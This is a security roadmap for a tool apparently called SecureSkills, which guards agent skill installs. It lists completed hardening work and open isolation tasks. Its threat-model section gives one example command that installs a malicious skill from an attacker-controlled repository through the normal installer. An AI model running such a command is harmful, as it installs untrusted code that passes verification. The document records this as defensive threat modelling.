# TODO

## Hardening Roadmap

### Shipped

- hard-fail on unexpected workspace symlinks during runtime mirroring
- validate mirror destinations before copy, mkdir, or delete operations
- create `.secureskills/keys` with `0700`
- write key files with `0600`
- validate skill names before any path joins
- add regression coverage for the above
- resolve and store git commit SHAs for installed git sources
- surface pinned source revisions in the manifest, lockfile, and `inspect`
- add installer channel and version selection with local install metadata
- add `LICENSE`
- add `SECURITY.md`
- document the v1 threat model and non-goals explicitly
- replace or redesign the current live mirror loop with a safer write-through or evented model
- reduce the shell-hook surface outside explicitly enabled repos
- detect runtime skill mutations and terminate on drift
- make the unlocked runtime skill tree read-only during sessions

### Remaining Runtime Hardening

- stronger isolation from unlocked runtime skill material
- reduce or eliminate writable plaintext materialization
- evaluate OS-enforced read-only mounts or agent-native loading

## Installer Authority

SecureSkills v1 treats the local project key as the trust root. That means a malicious script or other RCE already running with enough local privilege could invoke the normal installer flow itself, for example by running:

```bash
npx secureskills add <attacker-controlled-repo> --skill <malicious-skill>
```

If that happens, the malicious skill would be authorized through the legitimate install path and then pass runtime verification.

This needs later-stage mitigation. Candidate directions:

- interactive approval for first-time sources
- allowlists for trusted owners or repositories
- separate installer approval from normal runtime authority
- stronger policy around non-interactive installs

## Runtime Hardening

PlaTo now verifies skills before launch, uses a safer reconciler during sessions, detects post-launch drift, and keeps the unlocked runtime skill tree read-only during execution.

What remains is stronger isolation rather than baseline integrity.

Track this as a later hardening area:

- stronger isolation from unlocked runtime skill material
- reduce or eliminate writable plaintext skill materialization
- consider OS-enforced read-only mounting or agent-native loading
